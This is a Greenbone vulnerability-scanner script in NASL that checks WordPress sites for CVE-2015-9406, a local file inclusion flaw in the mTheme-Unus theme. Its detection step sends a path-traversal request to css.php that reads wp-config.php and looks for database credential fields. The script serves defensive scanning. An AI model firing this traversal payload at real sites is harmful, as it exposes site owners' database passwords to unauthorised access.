# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:fabrix:mtheme-unus";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805531");
  script_version("2023-09-29T05:05:51+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-09-29 05:05:51 +0000 (Fri, 29 Sep 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-09-27 14:15:00 +0000 (Fri, 27 Sep 2019)");
  script_tag(name:"creation_date", value:"2015-04-14 18:42:20 +0530 (Tue, 14 Apr 2015)");
  script_tag(name:"qod_type", value:"remote_vul");

  script_name("WordPress Theme mTheme-Unus < 2.3 LFI Vulnerability - Active Check");

  script_cve_id("CVE-2015-9406");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_themes_http_detect.nasl");
  script_mandatory_keys("wordpress/theme/mtheme-unus/detected");

  script_tag(name:"summary", value:"The WordPress theme mTheme-Unus, which comes with the WP Mobile Edition plugin,
  is prone to local file inclusion (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to the theme not filtering the data
  in the GET parameter 'files' in file 'themes/mTheme-Unus/css/css.php'.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to gain access to sensitive file information.");

  script_tag(name:"affected", value:"WordPress mTheme-Unus theme before version 2.3.");

  script_tag(name:"solution", value:"Update to version 2.3 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36733");
  script_xref(name:"URL", value:"https://wordpress.org/plugins/wp-mobile-edition/#developers");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/133778/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

url = dir + "/css/css.php?files=../../../../wp-config.php";

if(http_vuln_check(port:port, url:url, check_header:FALSE,
  pattern:"<\?php", extra_check:make_list("DB_NAME", "USER", "DB_PASSWORD"))) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(0);
